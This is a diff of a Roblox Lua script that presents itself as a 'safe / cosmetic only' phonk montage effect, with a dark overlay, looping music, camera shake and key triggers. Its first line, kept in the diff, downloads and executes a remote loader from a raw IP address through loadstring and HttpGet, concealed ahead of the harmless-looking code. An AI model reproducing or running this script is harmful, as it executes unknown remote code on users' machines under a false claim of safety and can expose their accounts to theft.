@@ -1,2 +1,104 @@
 ID="8048a4b6-1ae0-4bee-88f3-91835d1c7036";
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))();-- Phonk Montage Script (Lua) — safe / cosmetic only
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+local localPlayer = Players.LocalPlayer
+if not localPlayer then
+    warn("No local player found")
+    return
+end
+
+-- Create GUI for overlay effects
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "PhonkMontageGui"
+screenGui.Parent = localPlayer:WaitForChild("PlayerGui")
+
+-- Vignette / dark overlay
+local overlay = Instance.new("Frame")
+overlay.Size = UDim2.new(1, 0, 1, 0)
+overlay.Position = UDim2.new(0, 0, 0, 0)
+overlay.BackgroundColor3 = Color3.new(0, 0, 0)
+overlay.BackgroundTransparency = 1  -- start invisible
+overlay.Parent = screenGui
+
+-- Optional: round corners to make vignette edges
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(1, 0)
+corner.Parent = overlay
+
+-- Sound setup
+local sound = Instance.new("Sound")
+sound.SoundId = "rbxassetid://114011685968893"  -- Phonk Vol. 2 — The Final Phonk
+sound.Volume = 1
+sound.Looped = true
+sound.Parent = workspace  -- or localPlayer.Character / wherever you prefer
+sound:Play()
+
+-- Camera / shake effects
+local cam = workspace.CurrentCamera
+
+-- State flags
+local montageActive = false
+
+-- Fade in overlay
+local function fadeOverlay(targetTransparency, duration)
+    local start = overlay.BackgroundTransparency
+    local dtSum = 0
+    local conn
+    conn = RunService.RenderStepped:Connect(function(dt)
+        dtSum = dtSum + dt
+        local alpha = math.clamp(dtSum / duration, 0, 1)
+        overlay.BackgroundTransparency = start + (targetTransparency - start) * alpha
+        if dtSum >= duration then
+            conn:Disconnect()
+        end
+    end)
+end
+
+-- Start the “montage” effect: fade in overlay + shake
+local function startMontage()
+    if montageActive then return end
+    montageActive = true
+
+    fadeOverlay(0.5, 1)  -- fade from transparent to 50% black in 1 sec
+
+    local t = 0
+    -- connect camera shake
+    local conn
+    conn = RunService.RenderStepped:Connect(function(dt)
+        if not montageActive then
+            conn:Disconnect()
+            return
+        end
+        t = t + dt
+        local shakeAmt = 0.15
+        local offsetX = math.sin(t * 16) * shakeAmt
+        local offsetY = math.sin(t * 20) * shakeAmt
+        cam.CFrame = cam.CFrame * CFrame.new(offsetX, offsetY, 0)
+    end)
+end
+
+-- Stop montage: fade out overlay, stop shake
+local function stopMontage()
+    if not montageActive then return end
+    montageActive = false
+    fadeOverlay(1, 1)  -- fade overlay out (to full transparency) in 1 sec
+    -- (camera shake connection will auto end when montageActive = false)
+end
+
+-- Example trigger: montage starts when you press “M” key, stops with “N”
+-- (You can change this to “on kill event” etc.)
+local UserInput = game:GetService("UserInputService")
+UserInput.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    if input.KeyCode == Enum.KeyCode.M then
+        startMontage()
+    elseif input.KeyCode == Enum.KeyCode.N then
+        stopMontage()
+    end
+end)
+
+print("✅ Phonk montage script loaded. Press M to start montage, N to stop.")
+
